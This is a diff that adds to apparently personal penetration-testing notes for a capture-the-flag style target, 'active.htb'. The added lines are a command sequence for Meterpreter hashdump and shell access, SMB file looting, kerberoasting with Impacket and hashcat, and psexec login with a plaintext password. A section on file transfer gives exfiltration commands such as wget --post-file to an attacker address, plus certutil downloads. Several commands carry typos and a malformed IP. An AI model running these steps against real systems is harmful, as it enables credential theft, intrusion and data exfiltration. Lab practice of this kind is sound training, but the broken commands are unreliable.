@@ -366,3 +366,69 @@ set payload windows/x64/meterpreter/ #double tab to see options (reverse_tcp) se
 set payload windows/x64/meterpreter/reverse_tcp
 run
 sysinfo
+hashdump
+shell
+cd c:\users
+dir
+cd administrators
+dir
+cd documents
+arp -a
+route print
+netstat -ano
+
+#smbclient -L \\\\10.10.10.100\\Replication
+Enter
+Enter
+#to download all the files in smb, run RECURSE ON and then run PROMPT OFF
+RECURSE ON
+PROMPT OFF
+mget *
+
+
+#kerberoasting- authentication protocol. it uses tickets as a form of communication and authentication.
+locate GetUserSPNs
+cd /opt/impacket/examples/
+ls
+python GetUseSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100 -request
+#go and run hashcat in a command prompt or offline
+hashcat -help
+#run the kerberos module- kerboroast.txt has the hash
+hashcat64.exe -m 13100 kerboroast.txt rockyou.txt
+#search for psexec in metasploit opened in kali (msf6)
+search psexec
+use exploit/windows/smb/psexec
+options
+set smbdomain active.htb
+set smbuser administrator
+set smbpass TicketMaster1896
+set rhosts 10.10.10.100
+run
+set traget 2
+run
+
+#File transfers
+Linux file transfer always involve wget e.g
+wget http://192.178..202.120/secrets.txt  #pull secret file from his location
+#you can push file to a location with wget too
+wget --post-file-secrets.txt $ipaddress:$portnumber #quick way to send file or dump file to yourself.
+
+Windows- FTP, HTTP, Metasploit, certutil, Powershell, SFTP
+certutil -uricache -f http://$ipaddress/secrets.txt &nameofthefiletopull # f means file
+#ftp
+ftp $ipaddress
+$password of the server to pull file from
+$passwordoftheserver to pull file from
+get secrets.txt #to get the file nedded
+put secrets.txt #to push the file to where it is needed
+
+#metasploit
+upload /root/files/secrets.txt c:\\  #for upload
+download c:\\secrets.txt secrets.txt #download
+
+#some metasploit commands
+set rhosts $ip #set the host to have the given ip
+set lport $port number #the required port number
+set smbuser Administrator #set the smb user as Administrator
+set  smbpass $password - #set the password of the smbuser as given name
+run
